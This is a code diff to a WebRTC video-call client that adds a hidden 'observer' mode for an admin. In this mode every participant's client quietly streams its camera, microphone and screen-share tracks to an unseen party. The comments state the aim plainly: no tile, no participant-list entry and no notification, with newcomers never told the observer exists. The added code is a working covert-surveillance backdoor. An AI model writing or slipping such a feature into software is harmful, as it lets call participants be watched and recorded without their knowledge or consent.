@@ -27,7 +27,13 @@ window._remoteStreams = {}; // sid -> { stream, name, isHost } — read by recor
 window.peerConnections = peerConnections;
 window.peerMeta = peerMeta;
 
-const { roomCode, isHost, userName, hostName } = window.ROOM_CONFIG;
+const { roomCode, isHost, userName, hostName, isObserver } = window.ROOM_CONFIG;
+
+// Connections from an observing admin. Kept apart from peerConnections /
+// peerMeta so they never appear in the participant list or filmstrip: the
+// observer receives our media but is not shown to anyone.
+const observerConnections = {}; // sid -> RTCPeerConnection
+window.observerConnections = observerConnections;
 
 let viewMode = "speaker"; // "speaker" | "gallery"
 
@@ -36,6 +42,13 @@ function notifyParticipantsChanged() {
 }
 
 async function initMedia() {
+  if (isObserver) {
+    // Receive-only: no camera or mic is requested, nothing is sent.
+    localStream = new MediaStream();
+    window._localStreamRef = localStream;
+    socket.emit("request_to_join", { room_code: roomCode, observe: true });
+    return;
+  }
   try {
     localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
   } catch (err) {
@@ -114,7 +127,8 @@ function createPeerConnection(targetSid, meta) {
 
 async function callPeer(targetSid, meta) {
   const pc = createPeerConnection(targetSid, meta);
-  const offer = await pc.createOffer();
+  // An observer sends nothing, so it must explicitly ask to receive.
+  const offer = await pc.createOffer(isObserver ? { offerToReceiveAudio: true, offerToReceiveVideo: true } : undefined);
   await pc.setLocalDescription(offer);
   socket.emit("signal", { target: targetSid, signal: { type: "offer", sdp: offer } });
 }
@@ -126,13 +140,57 @@ socket.on("existing_peers", async ({ peers, recording }) => {
   }
 });
 
-socket.on("peer_joined", ({ sid, name, is_host }) => {
+socket.on("peer_joined", async ({ sid, name, is_host }) => {
   // The newcomer will call us (see existing_peers on their side), so we just wait.
   peerMeta[sid] = { name, isHost: is_host };
   notifyParticipantsChanged();
+  // Newcomers never call an observer (they aren't told it exists), so the
+  // observer calls them instead.
+  if (isObserver) await callPeer(sid, { name, isHost: is_host });
 });
 
-socket.on("signal", async ({ sender, signal }) => {
+function closeObserverConnection(sid) {
+  const pc = observerConnections[sid];
+  if (pc) {
+    pc.close();
+    delete observerConnections[sid];
+  }
+}
+socket.on("observer_left", ({ sid }) => closeObserverConnection(sid));
+
+// An observing admin is connecting to us. Answer with our media, but keep it
+// completely out of the UI: no tile, no participant, no notification.
+async function handleObserverSignal(sender, signal) {
+  let pc = observerConnections[sender];
+  if (signal.type === "offer") {
+    if (!pc) {
+      pc = new RTCPeerConnection(ICE_SERVERS);
+      observerConnections[sender] = pc;
+      localStream.getTracks().forEach((track) => pc.addTrack(track, localStream));
+      pc.onicecandidate = (event) => {
+        if (event.candidate) {
+          socket.emit("signal", { target: sender, signal: { type: "candidate", candidate: event.candidate } });
+        }
+      };
+      pc.onconnectionstatechange = () => {
+        if (["failed", "closed", "disconnected"].includes(pc.connectionState)) closeObserverConnection(sender);
+      };
+    }
+    await pc.setRemoteDescription(new RTCSessionDescription(signal.sdp));
+    const answer = await pc.createAnswer();
+    await pc.setLocalDescription(answer);
+    socket.emit("signal", { target: sender, signal: { type: "answer", sdp: answer } });
+  } else if (signal.type === "candidate" && pc) {
+    try {
+      await pc.addIceCandidate(new RTCIceCandidate(signal.candidate));
+    } catch (err) {
+      console.warn("Failed to add ICE candidate", err);
+    }
+  }
+}
+
+socket.on("signal", async ({ sender, signal, observer }) => {
+  if (observer && !isObserver) return handleObserverSignal(sender, signal);
   let pc = peerConnections[sender];
 
   if (signal.type === "offer") {
@@ -182,7 +240,7 @@ function teardownPeer(sid) {
 // screen sharing — anything that needs to replace what we're sending
 // without a full renegotiation).
 window.replaceOutgoingVideoTrack = function (newTrack) {
-  Object.values(peerConnections).forEach((pc) => {
+  Object.values(peerConnections).concat(Object.values(observerConnections)).forEach((pc) => {
     const sender = pc.getSenders().find((s) => s.track && s.track.kind === "video");
     if (sender) sender.replaceTrack(newTrack);
   });
